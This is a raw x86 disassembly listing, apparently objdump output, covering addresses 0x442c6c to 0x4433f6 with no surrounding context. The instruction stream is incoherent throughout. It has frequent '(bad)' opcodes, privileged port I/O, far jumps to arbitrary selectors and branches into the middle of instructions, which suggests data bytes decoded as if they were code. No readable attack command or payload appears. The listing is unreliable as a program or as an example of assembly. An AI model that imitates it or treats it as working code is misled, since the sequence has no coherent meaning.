  442c6c:	jmp    0x33fb8ab5
  442c71:	mov    esi,0x5f8593ee
  442c76:	inc    edx
  442c77:	(bad)  
  442c78:	pop    eax
  442c79:	push   edi
  442c7a:	pop    ebx
  442c7b:	lods   al,BYTE PTR ds:[esi]
  442c7c:	sbb    eax,0x9a8fee40
  442c81:	jp     0x442c23
  442c83:	out    dx,al
  442c84:	in     al,dx
  442c85:	pop    esi
  442c86:	jmp    0x442c98
  442c88:	inc    eax
  442c89:	loopne 0x442cb0
  442c8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442c8c:	dec    eax
  442c8d:	mov    eax,ds:0x5e3e7ee7
  442c92:	or     BYTE PTR [edx+0x148edcdb],0x7b
  442c99:	inc    eax
  442c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442c9b:	ds (bad) 
  442c9d:	rcl    BYTE PTR [esi+0x4d],1
  442ca0:	pop    esi
  442ca1:	rcl    dl,0x76
  442ca4:	mov    DWORD PTR [eax+0x5dd3e153],edi
  442caa:	inc    eax
  442cab:	jae    0x442c7c
  442cad:	xor    ch,BYTE PTR [edx+eiz*1-0x32]
  442cb1:	inc    edx
  442cb2:	dec    edi
  442cb3:	and    BYTE PTR [esi+0x2],bl
  442cb6:	jmp    0x442d09
  442cb8:	imul   ecx,DWORD PTR [esi],0x61561a1e
  442cbe:	adc    al,0x95
  442cc0:	je     0x442cb2
  442cc2:	fidivr WORD PTR [ebp-0x34]
  442cc5:	mov    esp,0xfbd390ee
  442cca:	xchg   edi,eax
  442ccb:	pop    edx
  442ccc:	mov    esp,0x42a43890
  442cd1:	dec    ecx
  442cd2:	scas   eax,DWORD PTR es:[edi]
  442cd3:	dec    edx
  442cd4:	jne    0x442cef
  442cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442cd7:	out    0x93,eax
  442cd9:	(bad)  
  442cda:	out    dx,al
  442cdb:	mov    WORD PTR [eax-0x68],ds
  442cde:	retf   0x1ac2
  442ce1:	xchg   ebp,eax
  442ce2:	mov    eax,0xbad0d3a0
  442ce7:	adc    esi,DWORD PTR [ebp+0x66]
  442cea:	xor    BYTE PTR [ebx],dl
  442cec:	scas   al,BYTE PTR es:[edi]
  442ced:	test   al,0xee
  442cef:	lock jbe 0x442c72
  442cf2:	lahf   
  442cf3:	not    DWORD PTR [edx+0x43]
  442cf6:	cmp    BYTE PTR [eax+ebx*8+0x4c714079],dl
  442cfd:	cmp    ebp,ebp
  442cff:	loope  0x442d5d
  442d01:	xor    edx,DWORD PTR [ecx+0x5a39c7ea]
  442d07:	push   cs
  442d08:	mov    dh,0x43
  442d0a:	jo     0x442ce3
  442d0c:	jo     0x442cee
  442d0e:	scas   al,BYTE PTR es:[edi]
  442d0f:	lods   eax,DWORD PTR ds:[esi]
  442d10:	int3   
  442d11:	xor    ebx,DWORD PTR [ecx]
  442d13:	cwde   
  442d14:	pop    esi
  442d15:	pushf  
  442d16:	or     DWORD PTR [ebp-0xb722635],ecx
  442d1c:	push   edi
  442d1d:	popa   
  442d1e:	mov    cl,0xc3
  442d20:	fdivr  DWORD PTR [eax+0x4afa8dd8]
  442d26:	jmp    0x442da4
  442d28:	pop    ebp
  442d29:	daa    
  442d2a:	call   0x874a:0x4bd125c9
  442d31:	inc    esp
  442d32:	add    al,0xc3
  442d34:	imul   esp,DWORD PTR [eax-0x4eaa2ae7],0x6d633ff3
  442d3e:	popf   
  442d3f:	imul   ebp,DWORD PTR [ecx+0x36dcb7ff],0x8e6241ba
  442d49:	rol    eax,1
  442d4b:	mov    ds:0x2b0750e6,al
  442d50:	mov    bl,0xff
  442d52:	scas   al,BYTE PTR es:[edi]
  442d53:	inc    esp
  442d54:	dec    esp
  442d55:	dec    ebp
  442d56:	clc    
  442d57:	iret   
  442d58:	inc    edi
  442d59:	and    dh,ch
  442d5b:	and    al,0xda
  442d5d:	retf   0x231b
  442d60:	ins    BYTE PTR es:[edi],dx
  442d61:	pusha  
  442d62:	mov    bl,0xfb
  442d64:	sub    BYTE PTR [edx-0x7799b118],ah
  442d6a:	jecxz  0x442d21
  442d6c:	pop    esi
  442d6d:	push   ecx
  442d6e:	fs out 0x1f,eax
  442d71:	sub    ch,BYTE PTR [esi+0x0]
  442d74:	cli    
  442d75:	jb     0x442d0b
  442d77:	inc    edi
  442d78:	xchg   ebp,eax
  442d79:	pusha  
  442d7a:	les    edi,FWORD PTR gs:[eax]
  442d7d:	adc    bl,ch
  442d7f:	das    
  442d80:	pop    esi
  442d81:	or     eax,0xbb5377a2
  442d86:	push   edi
  442d87:	std    
  442d88:	dec    edx
  442d89:	popa   
  442d8a:	push   es
  442d8b:	aaa    
  442d8c:	out    0x5b,eax
  442d8e:	adc    eax,0xeedae693
  442d93:	lahf   
  442d94:	mov    cs,esi
  442d96:	dec    edx
  442d97:	cmc    
  442d98:	repnz push esp
  442d9a:	aam    0xac
  442d9c:	lods   eax,DWORD PTR ds:[esi]
  442d9d:	out    0xed,al
  442d9f:	sub    DWORD PTR [esp+ecx*4-0x731e84f7],ebp
  442da6:	mov    cl,0x61
  442da8:	pop    esi
  442da9:	dec    DWORD PTR [edx]
  442dab:	jbe    0x442daa
  442dad:	cwde   
  442dae:	arpl   WORD PTR [edx-0x5ef45b62],ax
  442db4:	leave  
  442db5:	and    al,0x7b
  442db7:	inc    ebp
  442db8:	das    
  442db9:	mov    al,0xa2
  442dbb:	dec    esi
  442dbc:	out    dx,al
  442dbd:	call   0x6d3752b0
  442dc2:	fisub  WORD PTR [eax+edi*2-0x2b]
  442dc6:	adc    eax,0x9462e4a1
  442dcb:	fisubr WORD PTR [ecx-0x65]
  442dce:	pop    ss
  442dcf:	pushf  
  442dd0:	push   ebx
  442dd1:	jo     0x442e08
  442dd3:	sbb    BYTE PTR [edi],0x27
  442dd6:	int    0x82
  442dd8:	data16 shr bl,cl
  442ddb:	out    dx,al
  442ddc:	fchs   
  442dde:	aad    0x91
  442de0:	inc    edx
  442de1:	popa   
  442de2:	sar    BYTE PTR [edi-0x55a2e8eb],cl
  442de8:	(bad)  
  442de9:	imul   ebp,esi,0xffffffaf
  442dec:	ins    BYTE PTR es:[edi],dx
  442ded:	mov    ?,esp
  442def:	bound  esp,QWORD PTR [eax]
  442df1:	jle    0x442e47
  442df3:	mov    eax,ds:0x1605994a
  442df8:	mov    bl,0x4f
  442dfa:	xchg   ebp,eax
  442dfb:	cmp    BYTE PTR [ebp+0x6],bl
  442dfe:	js     0x442df3
  442e00:	fs ins DWORD PTR es:[edi],dx
  442e02:	neg    BYTE PTR [ebp+0x7a]
  442e05:	or     DWORD PTR [esi-0x70],ecx
  442e08:	fld    DWORD PTR [edx+eax*2]
  442e0b:	mov    eax,ds:0x6c9eed95
  442e10:	xchg   ecx,eax
  442e11:	mov    esi,0xa06cfbee
  442e16:	iret   
  442e17:	cmp    dl,BYTE PTR [ecx-0x2f]
  442e1a:	mov    eax,ds:0xd99afda1
  442e1f:	or     eax,0x4e8de7a2
  442e24:	pop    edi
  442e25:	outs   dx,DWORD PTR ds:[esi]
  442e26:	stos   DWORD PTR es:[edi],eax
  442e27:	push   edx
  442e28:	loopne 0x442dfb
  442e2a:	imul   esi,DWORD PTR [ecx],0xab6773a3
  442e30:	and    BYTE PTR [edi-0x13],ah
  442e33:	cld    
  442e34:	(bad)  
  442e35:	xlat   BYTE PTR ds:[ebx]
  442e36:	pop    edi
  442e37:	and    al,0x77
  442e39:	outs   dx,DWORD PTR ds:[esi]
  442e3a:	sti    
  442e3b:	js     0x442e38
  442e3d:	cmp    al,0xee
  442e3f:	mul    DWORD PTR ds:0x6a110683
  442e45:	and    eax,0xe9a0a0bd
  442e4a:	mov    edx,0x81d9b893
  442e4f:	test   al,0x5b
  442e51:	dec    edi
  442e52:	fdivr  st,st(3)
  442e54:	pop    ss
  442e55:	cmp    BYTE PTR [esi],ch
  442e57:	add    eax,0x877d51f9
  442e5c:	inc    edi
  442e5d:	popa   
  442e5e:	cwde   
  442e5f:	jmp    0x442e71
  442e61:	xor    bl,bl
  442e63:	adc    bl,ah
  442e65:	mov    esp,0x277000ee
  442e6a:	cdq    
  442e6b:	xor    cl,ch
  442e6d:	pcmpgtb mm4,QWORD PTR [ecx+0x56b94ed9]
  442e74:	dec    ebp
  442e75:	addr16 inc edi
  442e77:	mov    bh,0x5d
  442e79:	xchg   ebp,eax
  442e7a:	clc    
  442e7b:	ja     0x442e1a
  442e7d:	inc    esi
  442e7e:	(bad)  
  442e7f:	push   ebp
  442e80:	mov    ah,BYTE PTR [ecx]
  442e82:	cli    
  442e83:	mov    al,ds:0xe7da6b1
  442e88:	aas    
  442e89:	out    0x27,al
  442e8b:	push   ds
  442e8c:	pop    ecx
  442e8d:	in     eax,0x89
  442e8f:	(bad)  
  442e90:	jge    0x442e52
  442e92:	outs   dx,BYTE PTR ds:[esi]
  442e93:	jns    0x442f0b
  442e95:	sbb    esi,ecx
  442e97:	pushf  
  442e98:	jl     0x442ea7
  442e9a:	les    ebx,FWORD PTR [eax-0x32]
  442e9d:	dec    edx
  442e9e:	out    dx,al
  442e9f:	out    dx,al
  442ea0:	cs xchg esp,eax
  442ea2:	(bad)  
  442ea3:	ins    BYTE PTR es:[edi],dx
  442ea4:	jno    0x442f0d
  442ea6:	sbb    ah,BYTE PTR [ecx-0x38c08d85]
  442eac:	add    ch,ah
  442eae:	ret    
  442eaf:	cmp    al,0x5e
  442eb1:	and    BYTE PTR [ebx+0x10],bh
  442eb4:	jp     0x442e63
  442eb6:	jl     0x442eb1
  442eb8:	dec    ebx
  442eb9:	popa   
  442eba:	test   DWORD PTR [edi],ecx
  442ebc:	inc    DWORD PTR [ecx]
  442ebe:	mov    esp,0xfe27bd
  442ec3:	xor    eax,0x66c104ad
  442ec8:	sahf   
  442ec9:	cwde   
  442eca:	inc    esp
  442ecb:	cld    
  442ecc:	mov    al,ch
  442ece:	les    esp,FWORD PTR [edi+0x75869fe2]
  442ed4:	rol    DWORD PTR [eax-0x14f1d281],0xee
  442edb:	push   ds
  442edc:	sub    DWORD PTR [ebp-0x19],ecx
  442edf:	out    0x55,eax
  442ee1:	outs   dx,BYTE PTR ds:[esi]
  442ee2:	cld    
  442ee3:	mov    al,ds:0x239c467
  442ee8:	add    al,0x75
  442eea:	out    0xdd,al
  442eec:	pop    ecx
  442eed:	jl     0x442ee0
  442eef:	add    eax,0xe22e24b5
  442ef4:	fld    QWORD PTR [eax]
  442ef6:	dec    BYTE PTR [ebp-0x31535c53]
  442efc:	jo     0x442edd
  442efe:	adc    esp,DWORD PTR [ebp+0x551495ba]
  442f04:	or     dh,BYTE PTR [edi]
  442f06:	out    dx,al
  442f07:	mov    ebp,0x9537149c
  442f0c:	loopne 0x442f3c
  442f0e:	jbe    0x442eb1
  442f10:	mov    al,0x1d
  442f12:	in     eax,0x2f
  442f14:	add    al,0x18
  442f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442f17:	mov    ebp,0x9ed8225b
  442f1c:	pop    ebx
  442f1d:	scas   al,BYTE PTR es:[edi]
  442f1e:	push   ds
  442f1f:	add    ecx,esp
  442f21:	dec    esi
  442f22:	mov    cl,0xa0
  442f24:	test   eax,0xed566b67
  442f29:	jg     0x442f1f
  442f2b:	pop    ecx
  442f2c:	pop    ebp
  442f2d:	add    eax,0x61c14f7a
  442f32:	bound  ebx,QWORD PTR [edi-0x5eaf0792]
  442f38:	jecxz  0x442f48
  442f3a:	cwde   
  442f3b:	adc    al,0x44
  442f3d:	sub    esi,DWORD PTR [esi-0x903a24f]
  442f43:	dec    edx
  442f44:	inc    edi
  442f45:	jmp    0x73d6d472
  442f4a:	mov    eax,cs:0x14192437
  442f50:	cmp    BYTE PTR [eax+0x4c],bh
  442f53:	repz pop esi
  442f55:	repz mov al,0xc0
  442f58:	jae    0x442f92
  442f5a:	lahf   
  442f5b:	push   edi
  442f5c:	xor    BYTE PTR [ecx-0x7e],ah
  442f5f:	cld    
  442f60:	shr    DWORD PTR [ebp+0x7e2ac4ca],cl
  442f66:	out    dx,al
  442f67:	or     BYTE PTR [ecx-0x61],0xc0
  442f6b:	sub    eax,0xa18f5e6d
  442f70:	rol    BYTE PTR [esi],cl
  442f72:	inc    esi
  442f73:	adc    eax,DWORD PTR [edi+0x63e004d3]
  442f79:	sub    DWORD PTR [ebx],esi
  442f7b:	popa   
  442f7c:	popa   
  442f7d:	inc    ecx
  442f7e:	sbb    ebp,DWORD PTR [edx-0x44]
  442f81:	ds push 0xffffffa1
  442f84:	mov    ebx,0x49320678
  442f89:	mov    esi,0x65ec626
  442f8e:	mov    ds:0x1bf576a6,al
  442f93:	push   esp
  442f94:	jle    0x442ff6
  442f96:	ja     0x442fcc
  442f98:	inc    edx
  442f99:	loope  0x44300e
  442f9b:	cwde   
  442f9c:	jg     0x442f65
  442f9e:	out    dx,al
  442f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442fa0:	mov    dh,0x54
  442fa2:	scas   al,BYTE PTR es:[edi]
  442fa3:	mov    BYTE PTR [ecx+0x51],bh
  442fa6:	into   
  442fa7:	mov    al,ds:0xfbd63698
  442fac:	push   eax
  442fad:	push   esp
  442fae:	push   eax
  442faf:	nop
  442fb0:	pop    esi
  442fb1:	ins    DWORD PTR es:[edi],dx
  442fb2:	pop    ds
  442fb3:	(bad)
  442fb7:	pop    ebx
  442fb8:	pop    edi
  442fb9:	inc    esp
  442fba:	xchg   edx,eax
  442fbb:	lods   eax,DWORD PTR ds:[esi]
  442fbc:	or     ah,BYTE PTR [ecx]
  442fbe:	or     DWORD PTR [eax+0x43],0xfffffff1
  442fc2:	xlat   BYTE PTR ds:[ebx]
  442fc3:	adc    DWORD PTR [ebx+0x2c],ebx
  442fc6:	sti    
  442fc7:	and    DWORD PTR [eax+0x6],ebx
  442fca:	ds mov edi,0xa12fcdda
  442fd0:	dec    esp
  442fd1:	mov    DWORD PTR [esi],0x8e27caee
  442fd7:	cdq    
  442fd8:	je     0x442f78
  442fda:	add    BYTE PTR [esi+0x13ae5070],al
  442fe0:	jle    0x442fce
  442fe2:	pop    esi
  442fe3:	in     al,0x14
  442fe5:	jnp    0x443036
  442fe7:	bound  esi,QWORD PTR [eax+0x60]
  442fea:	mov    ds:0xc2e3469f,al
  442fef:	inc    edx
  442ff0:	push   edx
  442ff1:	push   eax
  442ff2:	leave  
  442ff3:	sbb    DWORD PTR [esi-0x6403ee6e],ebx
  442ff9:	ret    0xf3ac
  442ffc:	lds    esp,FWORD PTR [edx+0x623c60ec]
  443002:	or     al,dl
  443004:	push   ebx
  443005:	adc    esi,ebp
  443007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443008:	cwde   
  443009:	(bad)  [edi-0x570e73cd]
  44300f:	mov    al,ds:0x49654e7
  443014:	xor    al,0x68
  443016:	push   es
  443017:	cmp    eax,0xa1ebc75e
  44301c:	loop   0x442fcc
  44301e:	inc    ebp
  44301f:	or     ah,BYTE PTR ss:[ecx+0x6e]
  443023:	inc    ebp
  443024:	add    BYTE PTR [edi],0x5b
  443027:	xchg   edi,eax
  443028:	out    dx,eax
  443029:	lahf   
  44302a:	dec    esi
  44302b:	popf   
  44302c:	push   edx
  44302d:	test   BYTE PTR [edx],cl
  44302f:	mov    ebx,DWORD PTR [esi+0x68cc039e]
  443035:	addr16 push ebp
  443037:	mov    eax,ds:0x183df6dd
  44303c:	push   edx
  44303d:	jmp    0x44304e
  44303f:	fcomp  QWORD PTR [esi-0x6d]
  443042:	push   ds
  443043:	in     al,dx
  443044:	mov    bh,0x5
  443046:	fsub   DWORD PTR [ebp+0x22fd5a10]
  44304c:	pusha  
  44304d:	mov    edi,0xa39f81a4
  443052:	cmp    DWORD PTR [eax+0x36d0345e],0x67e73c90
  44305c:	mov    ds:0x439f885f,al
  443061:	dec    edi
  443062:	add    eax,DWORD PTR [bx-0x7f]
  443066:	ja     0x443069
  443068:	push   ecx
  443069:	pop    ebp
  44306a:	xlat   BYTE PTR ds:[ebx]
  44306b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44306c:	(bad)  
  44306e:	repnz push cs
  443070:	clc    
  443071:	add    BYTE PTR [ebx-0x539f911f],cl
  443077:	mov    bh,0x17
  443079:	test   al,0x6
  44307b:	push   ds
  44307c:	pop    ebp
  44307d:	sub    eax,0x2e7d91ee
  443082:	and    al,ch
  443084:	sub    al,0xc2
  443086:	fild   QWORD PTR [ecx+0x4c6e61c7]
  44308c:	test   ebx,esi
  44308e:	or     BYTE PTR [eax+0x4f],cl
  443091:	enter  0x2e7,0xf5
  443095:	mov    ebx,0xbceed856
  44309a:	push   0xc9607187
  44309f:	adc    bh,ch
  4430a1:	cld    
  4430a2:	add    ebp,DWORD PTR [ebx+0x4ffbba51]
  4430a8:	fxch   st(7)
  4430aa:	test   eax,0x6e03d539
  4430af:	test   BYTE PTR [edi-0x12608773],0xf2
  4430b6:	push   0xffffffff
  4430b8:	dec    ebx
  4430b9:	popa   
  4430ba:	xchg   ebp,eax
  4430bb:	es pusha 
  4430bd:	add    DWORD PTR [eax],0x28
  4430c0:	pop    esi
  4430c1:	sbb    al,0xa2
  4430c3:	sbb    esp,DWORD PTR [edi-0x5c]
  4430c6:	ret    0xebcb
  4430c9:	push   ecx
  4430ca:	mov    esi,es
  4430cc:	les    esi,FWORD PTR [edi-0x12]
  4430cf:	cli    
  4430d0:	push   ebx
  4430d1:	addr16 jmp 0xe0738f05
  4430d7:	ret    
  4430d8:	lea    esi,[bx]
  4430db:	in     eax,0x42
  4430dd:	push   ebx
  4430de:	das    
  4430df:	cwde   
  4430e0:	ins    BYTE PTR es:[edi],dx
  4430e1:	int    0xad
  4430e3:	shl    BYTE PTR [esi-0x4f8e7439],1
  4430e9:	and    bh,ch
  4430eb:	mov    ch,0x96
  4430ed:	pop    eax
  4430ee:	in     al,0x43
  4430f0:	inc    ebx
  4430f1:	stos   BYTE PTR es:[edi],al
  4430f2:	and    DWORD PTR [esi-0x22],eax
  4430f5:	stos   DWORD PTR es:[edi],eax
  4430f6:	pusha  
  4430f7:	fisttp DWORD PTR [ecx+0x16]
  4430fa:	arpl   WORD PTR [ecx-0x74],bp
  4430fd:	pusha  
  4430fe:	fimul  DWORD PTR [ebp-0x4134a478]
  443104:	aas    
  443105:	popa   
  443106:	lea    esi,[esi]
  443108:	dec    ebx
  443109:	push   edi
  44310a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44310b:	jb     0x4430c9
  44310d:	inc    ebp
  44310e:	fchs   
  443110:	push   edx
  443111:	cmc    
  443112:	xchg   ebp,eax
  443113:	dec    ebp
  443114:	fwait
  443115:	xor    al,BYTE PTR [ecx+0x61]
  443118:	(bad)  
  443119:	fimul  WORD PTR [esp+eax*2-0x36]
  44311d:	pusha  
  44311e:	mov    dh,0xa2
  443120:	adc    DWORD PTR [eax],eax
  443122:	pop    eax
  443123:	xor    bl,dl
  443125:	push   ds
  443126:	out    dx,al
  443127:	inc    ebp
  443128:	sbb    DWORD PTR ds:0x6ad2e8ad,esp
  44312e:	repnz mov al,ds:0xa1e399c9
  443134:	xchg   ebp,eax
  443135:	xor    al,0x33
  443137:	inc    ecx
  443138:	pop    ebp
  443139:	xor    BYTE PTR [edi-0x3e60192],dh
  44313f:	nop
  443140:	mov    cs,WORD PTR [ebp+0x40]
  443143:	jg     0x44315c
  443145:	popa   
  443146:	jno    0x44310e
  443148:	sub    ebp,esi
  44314a:	call   0x642d:0xee11da40
  443151:	ss jge 0x4430e8
  443154:	loop   0x443108
  443156:	cmp    DWORD PTR [ecx+0x7e372946],esp
  44315c:	lahf   
  44315d:	test   eax,0x1b67c760
  443162:	cdq    
  443163:	cmp    esp,DWORD PTR [ebx]
  443165:	loope  0x44310f
  443167:	inc    ebp
  443168:	mov    bh,0x8d
  44316a:	push   es
  44316b:	mov    eax,ds:0x959ce3de
  443170:	in     eax,0xe
  443172:	outs   dx,DWORD PTR ds:[esi]
  443173:	enter  0xe360,0x30
  443177:	mov    ah,0x85
  443179:	mov    BYTE PTR [esi-0x79b97500],bh
  44317f:	mov    eax,ds:0x180f5b17
  443184:	mov    eax,ds:0x80f4a5fb
  443189:	shr    esi,cl
  44318b:	adc    ah,al
  44318d:	inc    ebp
  44318e:	push   es
  44318f:	cmp    BYTE PTR [edx+0x43],bh
  443192:	mov    ah,BYTE PTR [ecx+0x25fcb01f]
  443198:	stc    
  443199:	das    
  44319a:	lods   eax,DWORD PTR ds:[esi]
  44319b:	jb     0x4431ee
  44319d:	dec    eax
  44319e:	rcl    DWORD PTR [edi],cl
  4431a0:	push   ds
  4431a1:	mov    edi,0x9ac5d076
  4431a6:	sub    al,0xa8
  4431a8:	xor    bh,BYTE PTR [esi]
  4431aa:	jns    0x443152
  4431ac:	mov    esi,DWORD PTR [eax+0x59e94b7]
  4431b2:	cmc    
  4431b3:	push   esi
  4431b4:	cmp    DWORD PTR [edi-0x5715de84],edx
  4431ba:	rcl    BYTE PTR [esi-0x78ea200],0xf3
  4431c1:	adc    BYTE PTR [ecx],ch
  4431c3:	in     al,0xd6
  4431c5:	sar    DWORD PTR ds:0x2dfc5ed4,1
  4431cb:	(bad)  
  4431cc:	call   0xc35e468f
  4431d1:	mov    dl,0x6b
  4431d3:	mov    eax,ds:0xf7f539b8
  4431d8:	push   ss
  4431d9:	into   
  4431da:	jecxz  0x4431c2
  4431dc:	pop    esi
  4431dd:	push   ebp
  4431de:	inc    eax
  4431df:	xchg   esi,eax
  4431e0:	repz scas al,BYTE PTR es:[edi]
  4431e2:	sar    DWORD PTR [ecx],1
  4431e4:	pop    esp
  4431e5:	pusha  
  4431e6:	push   edx
  4431e7:	rol    BYTE PTR [eax+ecx*1+0x62],cl
  4431eb:	inc    ecx
  4431ec:	cdq    
  4431ed:	mov    eax,0x6c5e3881
  4431f2:	loopne 0x44321e
  4431f4:	jnp    0x443189
  4431f6:	dec    edi
  4431f7:	loop   0x443183
  4431f9:	pusha  
  4431fa:	stos   DWORD PTR es:[edi],eax
  4431fb:	xchg   ecx,eax
  4431fc:	mov    DWORD PTR [edi+0x55],0x86ad9067
  443203:	xchg   esi,eax
  443204:	pop    esi
  443205:	dec    esi
  443206:	pop    edx
  443207:	js     0x443254
  443209:	aam    0x51
  44320b:	sar    BYTE PTR [edx-0x28004dab],cl
  443211:	pushf  
  443212:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  443214:	push   ds
  443215:	repz sub eax,0xab2585a0
  44321b:	add    BYTE PTR ds:0x96db00c2,bl
  443221:	(bad)  
  443222:	cmp    DWORD PTR cs:[ebx],ebp
  443225:	shl    BYTE PTR [edi-0xc],0xd1
  443229:	pop    edi
  44322a:	sub    al,0xc3
  44322c:	push   ss
  44322d:	xchg   esp,eax
  44322e:	outs   dx,DWORD PTR ds:[esi]
  44322f:	ins    DWORD PTR es:[edi],dx
  443230:	inc    ecx
  443231:	cwde   
  443232:	loopne 0x44329c
  443234:	test   BYTE PTR [ebx+0x61105723],al
  44323a:	and    DWORD PTR [eax],ecx
  44323c:	out    0x9c,eax
  44323e:	adc    al,0x50
  443240:	daa    
  443241:	popa   
  443242:	mov    dl,0x6a
  443244:	outs   dx,BYTE PTR ds:[esi]
  443245:	push   0x4419be7d
  44324a:	sti    
  44324b:	cwde   
  44324c:	push   edx
  44324d:	daa    
  44324e:	out    dx,al
  44324f:	cdq    
  443250:	jno    0x443200
  443252:	call   0x97a5a7e0
  443257:	rcr    ecx,0x39
  44325a:	int3   
  44325b:	lea    ebx,[edi]
  44325d:	mov    eax,ds:0x85f52028
  443262:	xchg   BYTE PTR [edi],ah
  443264:	jmp    0x44325a
  443266:	out    dx,al
  443267:	addr16 lahf 
  443269:	dec    edi
  44326a:	mov    WORD PTR [eax],cs
  44326c:	mov    ecx,0x9ca15344
  443271:	es icebp 
  443273:	sbb    BYTE PTR [ebp-0x12],bh
  443276:	mov    esp,esp
  443278:	xor    al,0xf9
  44327a:	jge    0x44329d
  44327c:	repz icebp 
  44327e:	add    BYTE PTR [edi+0x63],0x17
  443282:	daa    
  443283:	mov    eax,ds:0x4ca28192
  443288:	adc    DWORD PTR [ebp+0x3e5e0ac4],0xffffff9f
  44328f:	xor    esp,edi
  443291:	mov    ah,0x6f
  443293:	stc    
  443294:	mov    ebp,0x4dc235d
  443299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44329a:	data16 mov bl,0xaf
  44329d:	fld    QWORD PTR [esi-0x113cdab1]
  4432a3:	xchg   ebp,eax
  4432a4:	aad    0x49
  4432a6:	enter  0xdecb,0x78
  4432aa:	and    eax,0xf8612f7d
  4432af:	adc    al,0x24
  4432b1:	test   eax,0x20295d58
  4432b6:	out    0x81,eax
  4432b8:	into   
  4432b9:	in     eax,dx
  4432ba:	imul   esi,DWORD PTR [ebp+0x1e],0x72
  4432be:	mov    esi,DWORD PTR [ebp-0x7ed79eca]
  4432c4:	mov    ss,WORD PTR [esi+0x17]
  4432c7:	ret    
  4432c8:	ret    
  4432c9:	je     0x4432b9
  4432cb:	shl    BYTE PTR [ebx],cl
  4432cd:	and    DWORD PTR [esi-0x32],edx
  4432d0:	inc    edi
  4432d1:	fs dec eax
  4432d3:	mov    eax,ds:0xea47d46c
  4432d8:	push   esi
  4432d9:	ins    DWORD PTR es:[edi],dx
  4432da:	mov    esi,0xa16b5e4a
  4432df:	test   DWORD PTR [eax+0x44],esp
  4432e2:	dec    ebp
  4432e3:	and    BYTE PTR [edi],0x44
  4432e6:	ins    DWORD PTR es:[edi],dx
  4432e7:	or     bh,bl
  4432e9:	sbb    eax,0x76b8305
  4432ee:	add    eax,DWORD PTR ds:[edx-0x73]
  4432f2:	in     eax,dx
  4432f3:	dec    edi
  4432f4:	iret   
  4432f5:	ss scas eax,DWORD PTR es:[edi]
  4432f7:	xchg   BYTE PTR [ebx],bl
  4432f9:	out    0xde,eax
  4432fb:	call   0x39cb9bf2
  443300:	fdivp  st(4),st
  443302:	push   eax
  443303:	pop    ds
  443304:	sbb    eax,0x5e627a7d
  443309:	dec    ecx
  44330a:	call   ebp
  44330c:	stos   DWORD PTR es:[edi],eax
  44330d:	sbb    dh,BYTE PTR [ebx+0x6460fe53]
  443313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443314:	ror    BYTE PTR [esi],0xdc
  443317:	jge    0x443347
  443319:	xor    bl,ch
  44331b:	fidiv  WORD PTR [ecx+0x6b04c966]
  443321:	call   0x6122f87f
  443326:	mov    ecx,ss
  443328:	and    eax,0x71ed5545
  44332d:	jnp    0x443313
  44332f:	(bad)  
  443330:	pop    ebp
  443331:	rcr    BYTE PTR [eax+0x0],0x29
  443335:	in     al,dx
  443336:	sub    eax,edx
  443338:	sbb    ecx,0x1e
  44333b:	mov    edi,0xa179f1d2
  443340:	std    
  443341:	cmp    al,BYTE PTR [esi+0x60]
  443344:	xchg   esp,eax
  443345:	sub    cl,BYTE PTR [edi]
  443347:	mov    ebx,DWORD PTR [esi-0x3]
  44334a:	dec    ecx
  44334b:	jg     0x44338a
  44334d:	push   esp
  44334e:	add    edx,DWORD PTR [edx]
  443350:	hlt    
  443351:	pusha  
  443352:	xchg   edi,eax
  443353:	cld    
  443354:	out    dx,eax
  443355:	scas   eax,DWORD PTR es:[edi]
  443356:	and    BYTE PTR [ecx+0x45],bh
  443359:	adc    ch,dh
  44335b:	out    0x5,al
  44335d:	add    eax,0x366acc19
  443362:	fisub  DWORD PTR [edi-0x3ff9fc0c]
  443368:	cmp    bh,cl
  44336a:	stos   BYTE PTR es:[edi],al
  44336b:	and    bl,BYTE PTR [esi+0x5edf32e5]
  443371:	icebp  
  443372:	hlt    
  443373:	mov    esi,DWORD PTR [ecx]
  443375:	jmp    0xb375:0x608c71f9
  44337c:	mov    bl,0x48
  44337e:	fwait
  44337f:	inc    esi
  443380:	add    ch,ch
  443382:	out    dx,al
  443383:	push   es
  443384:	retf   0xe635
  443387:	icebp  
  443388:	mov    eax,0xa9a0b830
  44338d:	jmp    0x2b1e1aee
  443392:	cmp    ch,dl
  443394:	pop    esi
  443395:	jge    0x4433c4
  443397:	pusha  
  443398:	mov    cl,0x0
  44339a:	and    eax,0x8bc8e651
  44339f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4433a0:	stos   DWORD PTR es:[edi],eax
  4433a1:	and    al,0xa6
  4433a3:	lea    ebx,ds:0x3459eae
  4433a9:	cwde   
  4433aa:	jmp    FWORD PTR [esi+edx*8-0x46ce907e]
  4433b1:	(bad)  [edx-0x3c]
  4433b4:	dec    esi
  4433b5:	xchg   ecx,eax
  4433b6:	inc    ebx
  4433b7:	push   edi
  4433b8:	scas   eax,DWORD PTR es:[edi]
  4433b9:	inc    ecx
  4433ba:	hlt    
  4433bb:	in     eax,dx
  4433bc:	sub    al,0x61
  4433be:	mov    edx,0xed49d469
  4433c3:	rcr    DWORD PTR [esi-0x4c],0x5
  4433c7:	xchg   ecx,eax
  4433c8:	fsub   st,st(5)
  4433ca:	push   edi
  4433cb:	push   eax
  4433cc:	add    BYTE PTR [ecx+0x52],ah
  4433cf:	mov    dl,0xdc
  4433d1:	mov    edi,0x88b19bde
  4433d6:	out    dx,al
  4433d7:	addr16 xchg ebp,eax
  4433d9:	mov    DWORD PTR [ecx-0x31],esi
  4433dc:	xlat   BYTE PTR ds:[ebx]
  4433dd:	jb     0x443398
  4433df:	test   eax,0x136e2c19
  4433e4:	sub    DWORD PTR [eax+0x17a6f522],esp
  4433ea:	out    dx,al
  4433eb:	clc    
  4433ec:	and    al,BYTE PTR [esi+eax*4]
  4433ef:	imul   edi,DWORD PTR [esi-0x63159a28],0x60
  4433f6:	cmp    al,bl
